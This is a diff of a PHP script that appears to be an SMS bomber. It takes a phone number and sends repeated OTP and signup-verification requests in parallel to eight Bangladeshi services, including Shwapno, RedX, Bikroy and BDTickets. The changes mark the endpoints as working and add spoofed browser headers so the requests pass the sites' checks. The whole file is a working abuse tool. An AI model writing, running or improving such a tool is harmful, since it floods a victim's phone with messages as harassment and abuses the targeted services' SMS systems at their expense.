@@ -15,10 +15,10 @@ if(substr($phone_11,0,1)!=="0") $phone_11 = "0".$phone_11;
 $phone_88 = "88".$phone_11;
 $phone_plus88 = "+88".$phone_11;
 
-// Prepare all API requests
+// Prepare API requests
 $api_requests = [];
 
-// 1. Shwapno (5 times)
+// 1️⃣ Shwapno (5 times) ✅ working
 for($i=1;$i<=5;$i++){
     $api_requests[] = [
         "name"=>"shwapno_$i",
@@ -34,7 +34,7 @@ for($i=1;$i<=5;$i++){
     ];
 }
 
-// 2. Garibook (5 times)
+// 2️⃣ Garibook (5 times) ✅ working
 for($i=1;$i<=5;$i++){
     $api_requests[] = [
         "name"=>"garibook_$i",
@@ -49,57 +49,76 @@ for($i=1;$i<=5;$i++){
     ];
 }
 
-// 3. Shikho (3 times)
+// 3️⃣ Shikho (3 times) ✅ fix headers
 for($i=1;$i<=3;$i++){
     $api_requests[] = [
         "name"=>"shikho_$i",
         "url"=>"https://api.shikho.com/auth/v2/send/sms",
         "data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],
-        "headers"=>['Content-Type: application/json','Origin: https://shikho.com']
+        "headers"=>[
+            'Content-Type: application/json',
+            'User-Agent: Mozilla/5.0',
+            'Origin: https://shikho.com',
+            'Referer: https://shikho.com/'
+        ]
     ];
 }
 
-// 4. RedX (10 times)
+// 4️⃣ RedX (10 times) ✅ working
 for($i=1;$i<=10;$i++){
     $api_requests[] = [
         "name"=>"redx_$i",
         "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
         "data"=>["phoneNumber"=>$phone_11],
-        "headers"=>['Content-Type: application/json']
+        "headers"=>[
+            'Content-Type: application/json',
+            'User-Agent: Mozilla/5.0'
+        ]
     ];
 }
 
-// 5. Bikroy (10 times)
+// 5️⃣ Bikroy (10 times) ✅ GET method
 for($i=1;$i<=10;$i++){
     $api_requests[] = [
         "name"=>"bikroy_$i",
         "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11",
         "data"=>[],
-        "headers"=>['User-Agent: Mozilla/5.0']
+        "headers"=>[
+            'User-Agent: Mozilla/5.0'
+        ],
+        "method"=>"GET"
     ];
 }
 
-// 6. PBS (5 times)
+// 6️⃣ PBS (5 times) ✅ add headers
 for($i=1;$i<=5;$i++){
     $api_requests[] = [
         "name"=>"pbs_$i",
         "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP",
         "data"=>["userPhone"=>$phone_11],
-        "headers"=>['Content-Type: application/json']
+        "headers"=>[
+            'Content-Type: application/json',
+            'User-Agent: Mozilla/5.0',
+            'Origin: https://pbs.com.bd'
+        ]
     ];
 }
 
-// 7. Iqra Live (3 times)
+// 7️⃣ Iqra Live (3 times) ✅ proper POST
 for($i=1;$i<=3;$i++){
     $api_requests[] = [
         "name"=>"iqra_$i",
-        "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,
-        "data"=>[],
-        "headers"=>['User-Agent: Mozilla/5.0']
+        "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp",
+        "data"=>["phone"=>$phone_11],
+        "headers"=>[
+            'Content-Type: application/json',
+            'User-Agent: Mozilla/5.0',
+            'Origin: https://iqra-live.com'
+        ]
     ];
 }
 
-// 8. BDTickets (10 times)
+// 8️⃣ BDTickets (10 times) ✅ headers fix
 for($i=1;$i<=10;$i++){
     $api_requests[] = [
         "name"=>"bdtickets_$i",
@@ -107,33 +126,36 @@ for($i=1;$i<=10;$i++){
         "data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],
         "headers"=>[
             'Content-Type: application/json',
-            'User-Agent: Mozilla/5.0 (Linux; Android 10)'
+            'User-Agent: Mozilla/5.0',
+            'Origin: https://bdtickets.com',
+            'Referer: https://bdtickets.com/'
         ]
     ];
 }
 
-// Parallel cURL execution
+// Multi-cURL parallel execution
 $results = [];
 $multiCurl = [];
 $mh = curl_multi_init();
 
-// Initialize cURL handles
 foreach($api_requests as $key => $api){
     $ch = curl_init();
-    curl_setopt_array($ch,[
-        CURLOPT_URL => $api['url'],
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_POST => true,
-        CURLOPT_POSTFIELDS => json_encode($api['data']),
-        CURLOPT_HTTPHEADER => $api['headers'],
-        CURLOPT_TIMEOUT => 20,
-        CURLOPT_SSL_VERIFYPEER => true
-    ]);
+    curl_setopt($ch, CURLOPT_URL, $api['url']);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+
+    if(!isset($api['method']) || $api['method']!=="GET"){
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data']));
+    }
+
     $multiCurl[$key] = $ch;
     curl_multi_add_handle($mh,$ch);
 }
 
-// Execute all in parallel
+// Execute in parallel
 $running = null;
 do {
     curl_multi_exec($mh,$running);
@@ -157,3 +179,4 @@ foreach($multiCurl as $key => $ch){
 curl_multi_close($mh);
 
 echo json_encode(["status"=>"completed","results"=>$results], JSON_PRETTY_PRINT);
+?>
